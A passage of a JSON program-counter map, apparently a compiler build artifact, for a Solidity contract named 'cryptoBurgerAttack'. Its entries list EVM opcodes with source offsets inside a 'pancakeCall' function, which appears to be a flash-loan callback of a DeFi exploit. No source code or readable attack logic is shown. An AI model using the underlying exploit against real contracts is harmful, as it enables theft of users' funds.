      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        8020,
        8127
      ],
      "op": "JUMP",
      "path": "0"
    },
    "5986": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "5987": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "5989": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "5991": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "5992": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "DUP1",
      "path": "0"
    },
    "5993": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "DUP4",
      "path": "0"
    },
    "5994": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "SUB",
      "path": "0"
    },
    "5995": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "DUP2",
      "path": "0"
    },
    "5996": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "DUP7",
      "path": "0"
    },
    "5997": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "GAS",
      "path": "0"
    },
    "5998": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "5999": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "6000": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "DUP1",
      "path": "0"
    },
    "6001": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "6002": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x177F"
    },
    "6005": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "6006": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "6007": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "6009": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "DUP1",
      "path": "0"
    },
    "6010": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "6011": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "6012": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "6014": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "REVERT",
      "path": "0"
    },
    "6015": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "6016": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "POP",
      "path": "0"
    },
    "6017": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "POP",
      "path": "0"
    },
    "6018": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "POP",
      "path": "0"
    },
    "6019": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "POP",
      "path": "0"
    },
    "6020": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "6022": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "6023": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "6024": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "6026": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "DUP3",
      "path": "0"
    },
    "6027": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "6028": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "6030": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "6031": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6032": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6033": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "ADD",
      "path": "0"
    },
    "6034": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "6036": {
      "op": "NOT"
    },
    "6037": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "AND",
      "path": "0"
    },
    "6038": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "DUP3",
      "path": "0"
    },
    "6039": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "ADD",
      "path": "0"
    },
    "6040": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "6042": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "6043": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x17A7"
    },
    "6046": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "6047": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6048": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6049": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "ADD",
      "path": "0"
    },
    "6050": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6051": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2D0E"
    },
    "6054": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        8020,
        8127
      ],
      "op": "JUMP",
      "path": "0"
    },
    "6055": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8020,
        8127
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "6056": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8005,
        8127
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6057": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8005,
        8127
      ],
      "op": "POP",
      "path": "0"
    },
    "6058": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8137,
        8201
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 52,
      "value": "0x17DD"
    },
    "6061": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "6063": {
      "op": "DUP1"
    },
    "6064": {
      "op": "MLOAD"
    },
    "6065": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "6067": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "6070": {
      "op": "DUP4"
    },
    "6071": {
      "op": "CODECOPY"
    },
    "6072": {
      "op": "DUP2"
    },
    "6073": {
      "op": "MLOAD"
    },
    "6074": {
      "op": "SWAP2"
    },
    "6075": {
      "op": "MSTORE"
    },
    "6076": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "6078": {
      "op": "DUP1"
    },
    "6079": {
      "op": "MLOAD"
    },
    "6080": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "6082": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "6085": {
      "op": "DUP4"
    },
    "6086": {
      "op": "CODECOPY"
    },
    "6087": {
      "op": "DUP2"
    },
    "6088": {
      "op": "MLOAD"
    },
    "6089": {
      "op": "SWAP2"
    },
    "6090": {
      "op": "MSTORE"
    },
    "6091": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8158,
        8170
      ],
      "op": "DUP4",
      "path": "0"
    },
    "6092": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8171,
        8172
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "6094": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8158,
        8173
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6095": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8158,
        8173
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "6096": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8158,
        8173
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6097": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8158,
        8173
      ],
      "op": "LT",
      "path": "0"
    },
    "6098": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8158,
        8173
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "6101": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8158,
        8173
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "6102": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8158,
        8173
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "6105": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8158,
        8173
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "6108": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        8158,
        8173
      ],
      "op": "JUMP",
      "path": "0"
    },
    "6109": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8137,
        8201
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "6110": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 53,
      "value": "0x40"
    },
    "6112": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "6113": {
      "op": "PUSH4",
      "value": "0x7C0329D"
    },
    "6118": {
      "op": "PUSH1",
      "value": "0xE2"
    },
    "6120": {
      "op": "SHL"
    },
    "6121": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6122": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "6123": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "6125": {
      "op": "DUP1"
    },
    "6126": {
      "op": "MLOAD"
    },
    "6127": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "6129": {
      "op": "PUSH2",
      "value": "0x2FBE"
    },
    "6132": {
      "op": "DUP4"
    },
    "6133": {
      "op": "CODECOPY"
    },
    "6134": {
      "op": "DUP2"
    },
    "6135": {
      "op": "MLOAD"
    },
    "6136": {
      "op": "SWAP2"
    },
    "6137": {
      "op": "MSTORE"
    },
    "6138": {
      "offset": [
        526,
        568
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6139": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8277
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x1F00CA74"
    },
    "6144": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8277
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6145": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1810"
    },
    "6148": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6149": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8291,
        8306
      ],
      "op": "DUP7",
      "path": "0"
    },
    "6150": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8291,
        8306
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6151": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8320,
        8324
      ],
      "op": "DUP7",
      "path": "0"
    },
    "6152": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8320,
        8324
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6153": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "6155": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "ADD",
      "path": "0"
    },
    "6156": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2CED"
    },
    "6159": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        8227,
        8334
      ],
      "op": "JUMP",
      "path": "0"
    },
    "6160": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "6161": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "6163": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "6165": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "6166": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "DUP1",
      "path": "0"
    },
    "6167": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "DUP4",
      "path": "0"
    },
    "6168": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "SUB",
      "path": "0"
    },
    "6169": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6170": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "DUP7",
      "path": "0"
    },
    "6171": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "GAS",
      "path": "0"
    },
    "6172": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "6173": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "6174": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "DUP1",
      "path": "0"
    },
    "6175": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "6176": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x182D"
    },
    "6179": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "6180": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "6181": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "6183": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "DUP1",
      "path": "0"
    },
    "6184": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "6185": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "6186": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "6188": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "REVERT",
      "path": "0"
    },
    "6189": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "6190": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "POP",
      "path": "0"
    },
    "6191": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "POP",
      "path": "0"
    },
    "6192": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "POP",
      "path": "0"
    },
    "6193": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "POP",
      "path": "0"
    },
    "6194": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "6196": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "6197": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "6198": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "6200": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "DUP3",
      "path": "0"
    },
    "6201": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "6202": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "6204": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "6205": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6206": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6207": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "ADD",
      "path": "0"
    },
    "6208": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "6210": {
      "op": "NOT"
    },
    "6211": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "AND",
      "path": "0"
    },
    "6212": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "DUP3",
      "path": "0"
    },
    "6213": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "ADD",
      "path": "0"
    },
    "6214": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "6216": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "6217": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1855"
    },
    "6220": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "6221": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6222": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6223": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "ADD",
      "path": "0"
    },
    "6224": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6225": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2D0E"
    },
    "6228": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        8227,
        8334
      ],
      "op": "JUMP",
      "path": "0"
    },
    "6229": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8227,
        8334
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "6230": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8212,
        8334
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6231": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8212,
        8334
      ],
      "op": "POP",
      "path": "0"
    },
    "6232": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8344,
        8408
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 54,
      "value": "0x188B"
    },
    "6235": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "6237": {
      "op": "DUP1"
    },
    "6238": {
      "op": "MLOAD"
    },
    "6239": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "6241": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "6244": {
      "op": "DUP4"
    },
    "6245": {
      "op": "CODECOPY"
    },
    "6246": {
      "op": "DUP2"
    },
    "6247": {
      "op": "MLOAD"
    },
    "6248": {
      "op": "SWAP2"
    },
    "6249": {
      "op": "MSTORE"
    },
    "6250": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "6252": {
      "op": "DUP1"
    },
    "6253": {
      "op": "MLOAD"
    },
    "6254": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "6256": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "6259": {
      "op": "DUP4"
    },
    "6260": {
      "op": "CODECOPY"
    },
    "6261": {
      "op": "DUP2"
    },
    "6262": {
      "op": "MLOAD"
    },
    "6263": {
      "op": "SWAP2"
    },
    "6264": {
      "op": "MSTORE"
    },
    "6265": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8365,
        8377
      ],
      "op": "DUP4",
      "path": "0"
    },
    "6266": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8378,
        8379
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "6268": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8365,
        8380
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6269": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8365,
        8380
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "6270": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8365,
        8380
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6271": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8365,
        8380
      ],
      "op": "LT",
      "path": "0"
    },
    "6272": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8365,
        8380
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "6275": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8365,
        8380
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "6276": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8365,
        8380
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "6279": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8365,
        8380
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "6282": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        8365,
        8380
      ],
      "op": "JUMP",
      "path": "0"
    },
    "6283": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8344,
        8408
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "6284": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 55,
      "value": "0x40"
    },
    "6286": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "6287": {
      "op": "PUSH4",
      "value": "0x7C0329D"
    },
    "6292": {
      "op": "PUSH1",
      "value": "0xE2"
    },
    "6294": {
      "op": "SHL"
    },
    "6295": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6296": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "6297": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "6299": {
      "op": "DUP1"
    },
    "6300": {
      "op": "MLOAD"
    },
    "6301": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "6303": {
      "op": "PUSH2",
      "value": "0x2FBE"
    },
    "6306": {
      "op": "DUP4"
    },
    "6307": {
      "op": "CODECOPY"
    },
    "6308": {
      "op": "DUP2"
    },
    "6309": {
      "op": "MLOAD"
    },
    "6310": {
      "op": "SWAP2"
    },
    "6311": {
      "op": "MSTORE"
    },
    "6312": {
      "offset": [
        526,
        568
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6313": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8483
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x1F00CA74"
    },
    "6318": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8483
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6319": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x18BE"
    },
    "6322": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6323": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8497,
        8512
      ],
      "op": "DUP7",
      "path": "0"
    },
    "6324": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8497,
        8512
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6325": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8526,
        8530
      ],
      "op": "DUP7",
      "path": "0"
    },
    "6326": {
